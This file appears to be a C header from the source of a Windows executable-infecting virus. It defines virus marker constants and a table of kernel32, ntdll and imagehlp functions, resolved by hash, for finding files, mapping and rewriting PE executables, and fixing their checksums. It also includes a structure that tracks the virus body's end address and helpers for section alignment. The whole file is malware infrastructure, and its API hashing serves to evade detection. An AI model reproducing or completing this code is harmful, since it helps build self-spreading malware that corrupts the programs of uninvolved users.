#pragma once

#define BUFSIZE 512

#define WINVER 0x0A00
#define _WIN32_WINNT _WIN32_WINNT_WIN10

#include <Windows.h>
#include <winternl.h>
#include <imagehlp.h>

//#include <iostream>
//using namespace std;

#define VIRUS_KEY 0xF4
#define VIRUS_FLAG ((VIRUS_KEY^0x7FFFFFFF)^0xF0F0F0F0)

#define NtCurrentPeb()     (PPEB)(NtCurrentTeb()->ProcessEnvironmentBlock)


typedef BOOL (WINAPI *pCreateProcessA)(
    LPCSTR lpApplicationName,
    LPSTR lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL bInheritHandles,
    DWORD dwCreationFlags,
    LPVOID lpEnvironment,
    LPCSTR lpCurrentDirectory, 
    LPSTARTUPINFOA lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
    );

typedef HMODULE (WINAPI *pLoadLibraryExA)(
    LPCSTR lpLibFileName,
    HANDLE hFile,
    DWORD  dwFlags
    );

typedef FARPROC (WINAPI *pGetProcAddress)(
    HMODULE hModule,
    LPCSTR  lpProcName
    );

typedef HANDLE (WINAPI *pFindFirstFileA)(
    _In_    LPCSTR                  lpFileName,
    _Out_   LPWIN32_FIND_DATAA      lpFindFileData
    );

typedef HANDLE (WINAPI *pFindNextFileA)(
    _In_    HANDLE                  hFindFile,
    _Out_   LPWIN32_FIND_DATAA      lpFindFileData
    );

typedef BOOL (WINAPI *pFindClose)(
    _Inout_ HANDLE  hFindFile    
    );

typedef HANDLE (WINAPI *pCreateFileA)(
    _In_ LPCSTR lpFileName,
    _In_ DWORD dwDesiredAccess,
    _In_ DWORD dwShareMode,
    _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    _In_ DWORD dwCreationDisposition,
    _In_ DWORD dwFlagsAndAttributes,
    _In_opt_ HANDLE hTemplateFile
    );

typedef DWORD (WINAPI* pGetFileSize)(
    _In_ HANDLE hFile,
    _Out_opt_ LPDWORD lpFileSizeHigh
    );

typedef BOOL (WINAPI *pReadFile)(
    _In_ HANDLE hFile,
    _Out_ LPVOID lpBuffer,
    _In_ DWORD nNumberOfBytesToRead,
    _Out_opt_ LPDWORD lpNumberOfBytesRead,
    _Inout_opt_ LPOVERLAPPED lpOverlapped
    );

typedef BOOL (WINAPI *pWriteFile)(
    HANDLE       hFile,
    LPCVOID      lpBuffer,
    DWORD        nNumberOfBytesToWrite,
    LPDWORD      lpNumberOfBytesWritten,
    LPOVERLAPPED lpOverlapped
);


typedef BOOL (WINAPI * pCloseHandle)(
    HANDLE hObject
);

typedef LPVOID (WINAPI* pVirtualAlloc)(
    _In_opt_ LPVOID lpAddress,
    _In_ SIZE_T dwSize,
    _In_ DWORD flAllocationType,
    _In_ DWORD flProtect
    );

typedef BOOL (WINAPI* pVirtualFree)(
    _Pre_notnull_ _When_(dwFreeType == MEM_DECOMMIT,_Post_invalid_) _When_(dwFreeType == MEM_RELEASE,_Post_ptr_invalid_) LPVOID lpAddress,
    _In_ SIZE_T dwSize,
    _In_ DWORD dwFreeType
    );

typedef HANDLE (WINAPI* pCreateFileMappingA)(
    _In_     HANDLE hFile,
    _In_opt_ LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
    _In_     DWORD flProtect,
    _In_     DWORD dwMaximumSizeHigh,
    _In_     DWORD dwMaximumSizeLow,
    _In_opt_ LPCSTR lpName
    );

typedef LPVOID (WINAPI* pMapViewOfFile)(
    _In_ HANDLE hFileMappingObject,
    _In_ DWORD dwDesiredAccess,
    _In_ DWORD dwFileOffsetHigh,
    _In_ DWORD dwFileOffsetLow,
    _In_ SIZE_T dwNumberOfBytesToMap
    );

typedef PIMAGE_NT_HEADERS (__stdcall* pCheckSumMappedFile)(
    PVOID  BaseAddress,
    DWORD  FileLength,
    PDWORD HeaderSum,
    PDWORD CheckSum
);

typedef BOOL (WINAPI* pFlushViewOfFile)(
    _In_ LPCVOID lpBaseAddress,
    _In_ SIZE_T dwNumberOfBytesToFlush
    );

typedef BOOL (WINAPI* pUnmapViewOfFile)(
    _In_ LPCVOID lpBaseAddress
    );

typedef NTSTATUS (NTAPI *pNtClose)(
    IN  HANDLE Handle
    );

typedef DWORD (WINAPI* pGetEnvironmentVariableA)(
    _In_opt_ LPCSTR lpName,
    _Out_writes_to_opt_(nSize,return + 1) LPSTR lpBuffer,
    _In_ DWORD nSize
    );

typedef HANDLE (WINAPI* pCreateThread)(
    LPSECURITY_ATTRIBUTES   lpThreadAttributes,
    SIZE_T          dwStackSize,
    LPTHREAD_START_ROUTINE  lpStartAddress,
    LPVOID lpParameter,
    DWORD dwCreationFlags,
    LPDWORD lpThreadId
);

typedef DWORD (WINAPI* pWaitForSingleObject)(
  _In_ HANDLE hHandle,
  _In_ DWORD  dwMilliseconds
);


typedef HANDLE (WINAPI* pCreateMutexA)(
    LPSECURITY_ATTRIBUTES lpMutexAttributes,
    BOOL                  bInitialOwner,
    LPCSTR                lpName
);


typedef struct _IAT
{
    // kernel32.dll
    pLoadLibraryExA             fnLoadLibraryExA;           // 0x1ad4f305
    pGetProcAddress             fnGetProcAddress;           // 0xd38cd23
    
    pFindFirstFileA             fnFindFirstFileA;           // 0x10b03781
    pFindNextFileA              fnFindNextFileA;            // 0x4d01d59
    pFindClose                  fnFindClose;                // 0x309c47e0

    pCreateFileA                fnCreateFileA;              // 0xc75869c
    pGetFileSize                fnGetFileSize;              // 0x236f23d6
    pReadFile                   fnReadFile;                 // 0xc9a21e1
    pWriteFile                  fnWriteFile;                // 0x5ce6ec2
    pCloseHandle                fnCloseHandle;              // 0x158bec59

    pVirtualAlloc               fnVirtualAlloc;             // 0x22b92187
    pVirtualFree                fnVirtualFree;              // 0x25e4c2e3

    pCreateFileMappingA         fnCreateFileMappingA;       // 0x2da1e929
    pMapViewOfFile              fnMapViewOfFile;            // 0x3a2ef895
    pFlushViewOfFile            fnFlushViewOfFile;          // 0x29b0e5d7
    pUnmapViewOfFile            fnUnmapViewOfFile;          // 0x12107238

    pGetEnvironmentVariableA    fnGetEnvironmentVariableA;  // 0x32b50861

    pCreateThread               fnCreateThread;             // 0x4d89b8a
    pWaitForSingleObject        fnWaitForSingleObject;      // 0x1965f2c6

    pCreateMutexA               fnCreateMutexA;             // 0x46d6e46


    // ntdll.dll
    pNtClose            fnNtClose;                          // 0x30b4218e

    // Imagehlp.dll
    pCheckSumMappedFile fnCheckSumMappedFile;               // 0xda56dc6
    
} IAT, *PIAT;

typedef struct _DATA
{
    PIAT iat;
    PVOID this_file_base_address;
    PVOID end_of_virus_main_address;
    int end_virus;
} DATA, *PDATA;

DWORD Align(DWORD value, DWORD alignment)
{
    if (value % alignment == 0)
    {
        return value;
    }
    else
    {
        return (value/alignment + 1)*alignment;
    }
}

void ZeroMem(void* data, int size)
{
    for (int i = 0; i < size; i++)
    {
        *((unsigned char*)(data)+i) = 0;
    }
}

void MemCopy(void* dst, void *src, int size)
{
    for (int i = 0; i < size; i++)
    {
        *((unsigned char*)(dst)+i) = *((unsigned char*)(src)+i);
    }
}

BYTE StrCmp(void* str1, void *str2)
{
    for (int i = 0; ; i++)
    {
        if (*((unsigned char*)(str1)+i) != *((unsigned char*)(str2)+i))
        {
            return 0;
        }
        if (*((unsigned char*)(str1)+i) == 0 || *((unsigned char*)(str2)+i) == 0)
        {
            return 1;
        }
    }
}

unsigned long long MemoryToUint64(unsigned char* data)
{
    unsigned long long ans = 0;
    memcpy(&ans, data, 8);
    return ans;
}